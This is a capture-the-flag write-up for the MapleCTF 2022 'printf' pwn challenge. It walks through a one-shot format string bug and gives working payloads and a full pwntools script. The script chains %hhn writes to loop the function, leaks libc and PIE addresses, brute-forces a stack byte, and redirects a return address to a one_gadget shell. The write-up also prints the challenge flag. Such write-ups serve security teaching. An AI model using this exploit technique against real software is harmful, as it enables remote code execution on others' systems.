On this challenge, we were given a binary called [`chal`](https://github.com/M4rv3l-M3tavers3/MapleCTF2022/blob/main/Pwn/printf/chal).

## Initial Analysis

Let’s start by checking the binary via `checksec`.
```py
 1   Arch:     amd64-64-little
 2   RELRO:    Full RELRO
 3   Stack:    No canary found
 4   NX:       NX enabled
 5   PIE:      PIE enabled
```
Okay, so the binary is PIE and Full RELRO. Now, let’s try to analyze the binary by disassembling it.

## main
```js 
undefined8 main(void)

{
  alarm(0x3c);
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  ready();
  return 0;
}
```

## ready
```js
void ready(void)

{
  set();
  return;
}
```
## set
```js
void set(void)

{
  go();
  return;
}
```
## go
```js
long go(void)

{
  int iVar1;
  undefined4 extraout_var;
  
  fgets(s,0x100,stdin);
  iVar1 = printf(s);
  return CONCAT44(extraout_var,iVar1);
}
``` 

Ah, okay looking at the `go()` method, there is a format string bug. But that’s it, we don’t have any leak (which we need), and yet we were only given one chance to do the format string.

## Exploitation Plan 
Let’s start by trying to check the stack just before we call the `printf` method by gdb.

![image](https://user-images.githubusercontent.com/93731698/188689679-f2231ee1-1627-4c59-94cc-79cc209ec1c0.png)

We can see some interesting values here. The stack contains a libc address (to be precise `__libc_start_main+243`), and the stack address itself (We can see saved `rbp` of method `go()`, `set()`, and `ready()`).

Our target is to pop a shell with the format string bug, and one `printf` won’t be enough for us. So, the plan is:

- Thinking about how to send our input and call `printf` multiple times, so that we will be more versatile on the exploit
- Try to leak the libc base address, and then calculate the `execve` address (via one_gadget).
- Overwrite one of the saved return pointers to the calculated address, so that it will pop a shell.

## Solution 
To execute our plan, let’s try to use `one_gadget` first. I did a little bit of guessing, where based on the previous challenge called `warmup2`, I guessed that the libc version will be the same as my local (Ubuntu 20.04). So let’s try to do `one_gadget` on it.

```py
1   one_gadget '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
2   0xe3afe execve("/bin/sh", r15, r12)
3   constraints:
4     [r15] == NULL || r15 == NULL
5     [r12] == NULL || r12 == NULL
6
7   0xe3b01 execve("/bin/sh", r15, rdx)
8   constraints:
9     [r15] == NULL || r15 == NULL
10    [rdx] == NULL || rdx == NULL
11
12  0xe3b04 execve("/bin/sh", rsi, rdx)
13  constraints:
14    [rsi] == NULL || rsi == NULL
15    [rdx] == NULL || rdx == NULL
```
I’ll use the `0xe3b01` as the offset of our pop shell address, because based on observation in GDB, the r15 and rdx will be null, so it has fulfilled the constraints.

Now, we know that:

- Via format string, we can leak the libc base address
- We have the gadget address of `execve`, which means we know the value that we need to write to one of the saved return pointers
Let’s try to check the stack layout

```
gef➤  tele
0x007fffffffdbc0│+0x0000: 0x007fffffffdbd0  →  0x007fffffffdbe0  →  0x007fffffffdbf0  →  0x0000000000000000	 ← $rsp, $rbp
0x007fffffffdbc8│+0x0008: 0x005555555551f2  →  <set+18> nop 
0x007fffffffdbd0│+0x0010: 0x007fffffffdbe0  →  0x007fffffffdbf0  →  0x0000000000000000
0x007fffffffdbd8│+0x0018: 0x00555555555207  →  <ready+18> nop 
0x007fffffffdbe0│+0x0020: 0x007fffffffdbf0  →  0x0000000000000000
0x007fffffffdbe8│+0x0028: 0x0055555555524e  →  <main+68> mov eax, 0x0
0x007fffffffdbf0│+0x0030: 0x0000000000000000
0x007fffffffdbf8│+0x0038: 0x007ffff7ddd083  →  <__libc_start_main+243> mov edi, eax
```
Notice that the stack value in `0x007fffffffdbf8` is already pointing to the libc region. So, it is clear that we can just overwrite the last 3 bytes of the stored value with our calculated gadget address, but to do it, we need a way to repeat the `go()` method multiple times, so that we can overwrite the saved return pointer with our desired value.

The idea is that the saved rbp of `set()`, which is located in the `0x007fffffffdbd0` is pointing to another stack address `0x007fffffffdbe0`. If we’re able to overwrite the value stored in `0x007fffffffdbe0` with our desired address, we will be able to use it as our gadget to overwrite the stored pointer. For example:

- With format string attack, we overwrite the LSB of the value pointed by `0x007fffffffdbd0` with `0xc8`. That means the stored value inside `0x007fffffffdbe0` will be changed from `0x007fffffffdbf0` to `0x007fffffffdbc8`. Now, it points to the saved return pointer of the `go(`) method.
- And then using the format string attack again, if we overwrite the LSB of the value pointed by `0x007fffffffdbe0`, that means the value stored inside `0x007fffffffdbc8` will be overwritten, which means we now control our program execution flow.

So, based on the above example, it is clear that the goal of our first format string loop is:
- Overwrite the 8th param  <strong>pointed </strong> address last byte with `0xc8` (8th param is `0x007fffffffdbd0`, pointing to `0x007fffffffdbe0`, so what we overwrite is the value stored inside `0x007fffffffdbe0`).
- After that, overwrite the 10th param  <strong>pointed</strong> address last byte with 0xed(10th param is `0x007fffffffdbe0`, which due to the first payload, is now pointing to the saved return pointer of `go()` :D). Now, the `go()` will return to `set()` and the `set()` will call `go()` again. We successfully create the loop.
- Also, don’t forget to leak the libc address and stack address as well in the first payload.

So, the first loop payload is `%c%c%c%c%c%c%50x%hhn%181x%hhn||%6$p.%7$p.%13$p`. One of the important note is that, if we want to do a chain overwrite like this, we aren’t allowed to use any positional parameter at the beginning of it, because when `printf` see the first positional argument, it will copy the needed arguments to its buffer, so that we won’t be able to do the chain because the next positional argument will refer to the copied buffer, not the overwritten value.

For example, if we’re not spamming `%c`, and instead do it like `%56x%8$n%181x%10$n`, when we try to overwrite the pointed value by the 10th param, it will still refer to the old value (not the overwritten value from the first positional arguments) due to the copy logic.

You must be wondering why we overwrite the 8th param last byte with `0xc8`. Isn’t there an ASLR that always randomizes the stack address? Well, that’s true, but because we only guess the last byte, and the last byte will most likely end with `0x8`, the probability that it is correct is 1:16, which means brute-forcing is very possible.

So, the idea is we need to brute-force it by connecting to the remote server multiple times, with chance 1:16 that the last byte of the stack address which stored the saved return pointer of `go()` method is indeed `0xc8` or any value that we want (Later on my script, I choose `0x38` as my lucky number during guessing the LSB of the stack).

Now that we’re able to trigger the loop, the second format string loop would be used to:
- Overwrite the 10th param last byte with `0xed` again, so that the `go()` will be looped again. Notes that the 10th param is our crafted gadget from the previous loop.
- Overwrite the 6th param <strong>pointed</strong> address last byte with 0xf8, so that the 8th param will point to `0x007fffffffdbf8` instead of `0x007fffffffdbe0`.
- Overwrite the 8th param <strong>pointed</strong> address two last bytes with our two last bytes of the calculated win address (8th param is pointing to the saved return pointer of main() method which is stored in `0x007fffffffdbf8`).
The second payload will be `%c%c%c%c%100x%hhn%133x%10$hhn%51732x%8$hn`.
Now, on the final loop, the last format string loop would be used to:

- Overwrite the 6th param <strong>pointed</strong> address last byte with `0xf8+2`, so that the 8th param will point to `0x007fffffffdbfa` instead of `0x007fffffffdbe0`. We’re trying to overwrite the third last byte.
- Overwrite the 8th param <strong>pointed</strong> address last bytes with our third LSB of the calculated win address.

The final payload will be `%c%c%c%c%100x%hhn%133x%10$hhn%51732x%8$hn`. Because we didn’t overwrite the saved return pointer of `go()`, after the `printf` got executed, it will continue the normal flow, and when the main() method is returned, it will return to the shell.

Full script

```js 
from pwn import *
from pwn import p64, u64, p32, u32

context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
elf = ELF('./chal')

while True:
    if args.LOCAL:
        r = process(['./chal'], env={})
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript='''
            b *go+47
            ''')
    else:
        r = remote('printf.ctf.maplebacon.org', 1337)

    # Assuming that the address of the return pointer of go() LSB is 0x38
    # For local testing, turn off ASLR to make it easier to test
    bruteforce_stack_lsb = 0x38

    # The LSB of set() line which do 'CALL go'
    call_go_lsb = 0xed

    # Payload notes:
    # - Overwrite the LSB of saved rbp of ready() to point to the saved return pointer of go()
    # - Overwrite the LSB of saved return pointer of go() to set()+13 (so that it will call go() again)
    # - Also try to leak the pie base, libc base, and LSB of the stack address
    # After executing the payload, if our bruteforced lsb is correct, we will back to the go() function again
    payload = f'%c%c%c%c%c%c%{bruteforce_stack_lsb-6}x%hhn%{call_go_lsb-bruteforce_stack_lsb}x%hhn||%6$p.%7$p.%13$p'.encode()
    print(f'First payload: {payload}')
    r.sendline(payload)
    out = r.recvline().strip().split(b'||')[1].split(b'.')
    stack_addr = int(out[0][-2:], 16)
    leaked_pie = int(out[1], 16)
    leaked_libc = int(out[2], 16)
    log.info(f'Leaked pie : {hex(leaked_pie)}')
    log.info(f'Leaked libc: {hex(leaked_libc)}')
    log.info(f'Stack addr : {hex(stack_addr)}')

    if stack_addr != 0x40:
        # Re-init connection
        r.close()
        continue

    elf.address = leaked_pie - elf.symbols['set'] - 18
    libc.address = leaked_libc - libc.symbols['__libc_start_main'] - 243
    log.info(f'Pie base   : {hex(elf.address)}')
    log.info(f'Libc base  : {hex(libc.address)}')
    win_addr = libc.address + 0xe3b01 # rdx and r15 null via one_gadget
    log.info(f'Libc win  : {hex(win_addr)}')

    # Second loop payload notes:
    # From the first loop, we already have gadget to overwrite the saved return pointer of go(), stored inside
    # the saved rbp of the ready() function.
    # Now, the detail of the payload:
    # - Overwrite the LSB of saved rbp of set() the LSB of the stack address of the saved return pointer of main()
    # - Overwrite the LSB of saved return pointer of go() to set()+13 with our crafter gadget from the first loop
    # - Overwrite first and second LSB of saved return pointer of main() to our win address (shell via one_gadget)
    total = 4
    s1 = stack_addr+0x28 - total
    total += s1
    s2 = 0xed - total
    total += s2
    s3 = (win_addr % 0x10000)-total
    payload = f'%c%c%c%c%{s1}x%hhn%{s2}x%10$hhn%{s3}x%8$hn'.encode()
    print(f'Second payload: {payload}')
    r.sendline(payload)

    # Third loop notes:
    # - Overwrite the LSB of saved rbp of set() to point to the saved return pointer of main() + 2 (Because we have overwritten two bytes)
    # - Overwrite the third LSB of saved return pointer of main() with the third LSB of our shell address
    # Now the main() will ret to shell
    total = 4
    s1 = stack_addr+0x28+2-total
    total += s1
    s2 = ((win_addr// 0x10000) % 0x100)-total
    print(hex(((win_addr// 0x10000) % 0x100)))
    payload = f'%c%c%c%c%{s1}x%hhn%{s2}x%8$hhn'.encode()
    print(f'Third payload: {payload}')
    r.sendline(payload)
    r.interactive()
```
![image](https://user-images.githubusercontent.com/93731698/188695415-7505846b-09d7-43dd-a4f2-880ce036b19a.png)
> `Flag: maple{F0wm47_57w1ng_3xpl01t_UwU}`
